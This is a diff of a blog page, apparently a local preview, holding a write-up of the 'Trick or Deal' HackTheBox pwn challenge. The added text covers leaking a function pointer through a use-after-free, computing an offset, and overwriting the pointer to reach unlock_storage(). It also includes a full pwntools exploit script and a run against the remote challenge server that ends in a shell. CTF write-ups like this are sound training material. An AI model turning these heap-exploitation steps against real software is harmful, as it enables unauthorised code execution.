@@ -1,23 +1,22 @@
 <!DOCTYPE html>
 <html>
-    <head>
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <title>Writeup: Trick or Deal &middot; </title>
-        <meta name="description" content="Introduction Trick or Deal is a Medium retired hackthebox pwn challenge.
+        <meta name="description" content="Introduction Trick or Deal is a Medium retired hackthebox pwn challenge. It has 97 solves and no writeup at the publication of this blog post.
 This binary has a secret function unlock_storage(), and a Use-After-Free vulnerability.
 To exploit this binary, I will use pwndbg and pwntools.
 Ghidra was also used for the analysis. The snippets of C code were obtained using the Ghidra decompiler.
-Analysis The binary gives us a menu with 5 actions. Each action will call a function.
--_-_-_-_-_-_-_-_-_-_-_-_- | | | [1] See the Weaponry | | [2] Buy Weapons | | [3] Make an Offer | | [4] Try to Steal | | [5] Leave | | | -_-_-_-_-_-_-_-_-_-_-_-_- [*] What do you want to do?">
+Analysis The binary gives us a menu with 5 actions.">
         <meta name="HandheldFriendly" content="True">
         <meta name="MobileOptimized" content="320">
-        <meta name="generator" content="Hugo 0.111.3">
+        <meta name="generator" content="Hugo 0.128.2">
         <meta name="robots" content="index,follow">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
-        <link rel="stylesheet" href="https://blog.lasne.pro/dist/site.css">
-        <link rel="stylesheet" href="https://blog.lasne.pro/dist/syntax.css">
+        <link rel="stylesheet" href="http://localhost:1313/dist/site.css">
+        <link rel="stylesheet" href="http://localhost:1313/dist/syntax.css">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
         <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
         
@@ -29,6 +28,9 @@ Analysis The binary gives us a menu with 5 actions. Each action will call a func
     </head>
     <body>
         
+  
+
+
 
         <div id="wrapper">
             <header class="site-header">
@@ -36,7 +38,7 @@ Analysis The binary gives us a menu with 5 actions. Each action will call a func
                     <div class="site-title-wrapper">
                         
                             <h1 class="site-title">
-                                <a href="https://blog.lasne.pro/">Olivier LASNE</a>
+                                <a href="http://localhost:1313/">Olivier LASNE</a>
                             </h1>
                         
                         
@@ -70,7 +72,7 @@ Analysis The binary gives us a menu with 5 actions. Each action will call a func
     
 
     <h1 id="introduction">Introduction</h1>
-<p><strong>Trick or Deal</strong> is a <em>Medium</em> retired <a href="https://app.hackthebox.com/challenges/trick-or-deal">hackthebox</a> <em><strong>pwn</strong></em> challenge.</p>
+<p><strong>Trick or Deal</strong> is a <em>Medium</em> retired <a href="https://app.hackthebox.com/challenges/trick-or-deal">hackthebox</a> <em><strong>pwn</strong></em> challenge. It has 97 solves and no writeup at the publication of this blog post.</p>
 <p>This binary has a secret function <code>unlock_storage()</code>, and a <strong>Use-After-Free</strong> vulnerability.</p>
 <p>To exploit this binary, I will use <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> and <a href="https://docs.pwntools.com/en/stable/">pwntools</a>.<br>
 <a href="https://ghidra-sre.org/">Ghidra</a> was also used for the analysis. The snippets of <strong>C</strong> code were obtained using the <em>Ghidra decompiler</em>.</p>
@@ -441,7 +443,7 @@ Starting program: <font color="#A6E22E">./trick_or_deal</font>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><h3 id="leak-address">Leak address</h3>
-<p>We free the initial buffer, and we malloc</p>
+<p>We free the initial buffer, and we malloc enough data to bridge the pointer we aim to leak. By leaving no space before the variable, it will be printed when we call <code>printStorage()</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>free()
@@ -488,7 +490,7 @@ Starting program: <font color="#A6E22E">./trick_or_deal</font>
 </code></pre></div>
 
 
-<p>We have filled the buffer with <code>'Y'</code> and there is no  <code>'\x00'</code> left that would indicate an end of file.
+<p>We have filled the buffer with <code>'Y'</code> and there is no  <code>'\x00'</code> left that would indicate a <em>end of file</em>.
 The pointer will be considered as part of the string and will be printed when we call <code>printStorage()</code>.</p>
 
 
@@ -507,9 +509,205 @@ The pointer will be considered as part of the string and will be printed when we
 </code></pre></div>
 
 
+<h3 id="calculate-the-offset">Calculate the Offset</h3>
+<p>First, let&rsquo;s use <em>gdb</em> to see the address of each function.</p>
 
 
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>p printStorage 
+$1 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400be6</font> &lt;<font color="#F4BF75">printStorage</font>&gt;
+<font color="#F92672"><b>pwndbg&gt; </b></font>p unlock_storage 
+$2 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400eff</font> &lt;<font color="#F4BF75">unlock_storage</font>&gt;
+</code></pre></div>
+
+
+<p>Now, let&rsquo;s calculate the offset between the two functions with <em>python</em>.</p>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ python3
+Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
+>>> hex(0x555555400eff - 0x555555400be6)
+'0x319'
+</code></pre></div>
+
+
+<p>Now we just have to add this value to the leaked pointer to calculate the address of <code>unlock_storage()</code>.
+Let&rsquo;s add this to our exploit script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>readline()[:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;printStorage leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>unlock_storage <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x319</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;unlock_storage: </span><span style="color:#e6db74">{</span>hex(unlock_storage)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="overwrite-the-function-pointer">Overwrite the function pointer</h3>
+<p>Now we can overwrite the pointer to <code>printStorage()</code> with a pointer to <code>unlock_storage()</code>.</p>
+<p>Let&rsquo;s <em>free()</em> the buffer using our helper function, then fill it with <em>0x48</em> chars and overwrite the function pointer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python3" data-lang="Python3"><span style="display:flex;"><span><span style="color:#75715e"># overwrite printStorage with unlock_storage</span>
+</span></span><span style="display:flex;"><span>free()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;V&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x48</span> <span style="color:#f92672">+</span> p64(unlock_storage)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">0x50</span>, payload)
+</span></span></code></pre></div><p>Our heap look like this now.</p>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis 1 0x555555603290
+
+0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
+0x5555556032a0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032b0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032c0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032d0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032e0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x0000555555400eff</font> <font color="#A1EFE4">VVVVVVVV..@UUU..</font>
+0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font>  &lt;-- Top chun
+</code></pre></div>
+
+
+<h3 id="call-unlock_storage">Call <code>unlock_storage()</code></h3>
+<p>All that&rsquo;s left to do is to call the function pointer, with the first action.</p>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">[*] What do you want to do? <font color="#F92672"><b>$</b></font> 1
+
+<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>
+
+<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
+<font color="#F92672"><b>$</b></font> id
+uid=1000(kali) gid=1000(kali) groups=1000(kali)
+</code></pre></div>
+
+
+<p>Add this ultimate step, and we have a complete exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What do you want to do? &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="remote-option">Remote option</h3>
+<p>It&rsquo;s nice to have a REMOTE option to target the ctf server. I generally modify the <code>start()</code> function of the exploit script with this option.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE: <span style="color:#75715e"># (&#39;server:port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">0</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span></code></pre></div><h2 id="final">Final</h2>
+<p>Below the full exploit script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python3" data-lang="Python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This exploit template was generated via:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ pwn template trick_or_deal</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tilix&#39;</span>, <span style="color:#e6db74">&#39;--action=session-add-right&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;trick_or_deal&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Many built-in settings can be controlled on the command line and show up</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for all created processes...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py DEBUG NOASLR</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE: <span style="color:#75715e"># (&#39;server:port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">0</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">set glibc 2.31
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#tbreak main
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Arch:     amd64-64-little</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELRO:    Full RELRO</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stack:    Canary found</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># NX:       NX enabled</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PIE:      PIE enabled</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RUNPATH:  b&#39;./glibc/&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper functions</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What do you want to do?&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(size, data):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What do you want to do?&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] Are you sure that you want to make an offer(y/n): &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] How long do you want your offer to be?&#39;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What can you offer me? &#39;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit code</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We don&#39;t overwrite the function pointer so that we can leak it.</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x48</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Y&#39;</span>
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">0x58</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leak pointer</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What do you want to do? &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Y&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x48</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>readline()[:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;printStorage leak: </span><span style="color:#e6db74">{</span>hex(leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>unlock_storage <span style="color:#f92672">=</span> leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x319</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;unlock_storage: </span><span style="color:#e6db74">{</span>hex(unlock_storage)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite printStorage with unlock_storage</span>
+</span></span><span style="display:flex;"><span>free()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;V&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x48</span> <span style="color:#f92672">+</span> p64(unlock_storage)
+</span></span><span style="display:flex;"><span>malloc(<span style="color:#ae81ff">0x50</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[*] What do you want to do? &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;id&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Let&rsquo;s attack the remote server.</p>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ ./xpl.py REMOTE 64.227.46.56:32650
+[<font color="#66D9EF"><b>*</b></font>] &apos;/home/hackthebox/challenge/pwn/Trick_or_Deal/trick_or_deal&apos;
+    Arch:     amd64-64-little
+    RELRO:    <font color="#A6E22E">Full RELRO</font>
+    Stack:    <font color="#A6E22E">Canary found</font>
+    NX:       <font color="#A6E22E">NX enabled</font>
+    PIE:      <font color="#A6E22E">PIE enabled</font>
+    RUNPATH:  <font color="#F92672">b&apos;./glibc/&apos;</font>
+[<font color="#A6E22E"><b>+</b></font>] Opening connection to 64.227.46.56 on port 32650: Done
+[<font color="#66D9EF"><b>*</b></font>] printStorage leak: 0x559901e00be6
+[<font color="#66D9EF"><b>*</b></font>] unlock_storage: 0x559901e00eff
+[<font color="#66D9EF"><b>*</b></font>] Switching to interactive mode
+
+<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>
+
+<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+<font color="#F92672"><b>$</b></font> ls
+flag.txt  glibc  ld-2.31.so  libc-2.31.so  trick_or_deal
 </code></pre></div>
 
 
@@ -529,7 +727,7 @@ The pointer will be considered as part of the string and will be printed when we
             <div class="container">
                 <div class="site-title-wrapper">
                     <h1 class="site-title">
-                        <a href="https://blog.lasne.pro/">Olivier LASNE</a>
+                        <a href="http://localhost:1313/">Olivier LASNE</a>
                     </h1>
                     <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
                         <i class="fa fa-angle-up" aria-hidden="true"></i>
@@ -537,7 +735,7 @@ The pointer will be considered as part of the string and will be printed when we
                 </div>
 
                 <p class="footer-copyright">
-                    <span>&copy; 2023 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                    <span>&copy; 2024 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
                 </p>
                 <p class="footer-copyright">
                     <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
@@ -546,9 +744,9 @@ The pointer will be considered as part of the string and will be printed when we
             </div>
         </footer>
 
-        <script src="https://blog.lasne.pro/js/jquery-1.11.3.min.js"></script>
-        <script src="https://blog.lasne.pro/js/jquery.fitvids.js"></script>
-        <script src="https://blog.lasne.pro/js/scripts.js"></script>
+        <script src="http://localhost:1313/js/jquery-1.11.3.min.js"></script>
+        <script src="http://localhost:1313/js/jquery.fitvids.js"></script>
+        <script src="http://localhost:1313/js/scripts.js"></script>
         
     </body>
 </html>
